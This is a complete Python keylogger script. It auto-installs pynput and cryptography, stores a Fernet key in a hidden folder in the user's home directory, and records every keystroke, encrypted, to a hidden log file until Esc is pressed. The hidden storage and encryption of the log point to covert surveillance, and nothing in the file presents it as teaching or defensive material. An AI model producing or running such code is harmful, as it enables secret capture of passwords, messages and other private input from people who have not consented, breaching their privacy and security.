import os
import subprocess

# Check if pynput is installed
try:
    import pynput
except ImportError:
    print("pynput is not installed. Installing...")
    
    # Install pynput using pip
    subprocess.check_call(['pip', 'install', 'pynput'])

# Check if cryptography is installed
try:
    from cryptography.fernet import Fernet
except ImportError:
    print("cryptography is not installed. Installing...")
    
    # Install cryptography using pip
    subprocess.check_call(['pip', 'install', 'cryptography'])
    from cryptography.fernet import Fernet

# Generate a key for encryption
key = Fernet.generate_key()

# Store the generated key in a file for future use
hidden_dir = os.path.join(os.path.expanduser("~"), ".hidden_dir")
os.makedirs(hidden_dir, exist_ok=True)

encryption_key_file = os.path.join(hidden_dir, "encryption_key.txt")
with open(encryption_key_file, "wb") as f:
    f.write(key)

cipher = Fernet(key)

def encrypt_message(message):
    return cipher.encrypt(message.encode())

def decrypt_message(token):
    return cipher.decrypt(token).decode()

from pynput.keyboard import Key, Listener

# Function to handle key presses
def on_press(key):
    try:
        # Encrypt the pressed key and write to the log file
        with open(os.path.join(hidden_dir, "keylog_encrypted.txt"), "ab") as f:
            encrypted_key = encrypt_message(str(key))
            f.write(encrypted_key)
            f.write(b'\n')  # Add a newline to separate each entry
    except AttributeError:
        # Ignore special keys
        pass

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Start listening for key presses
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()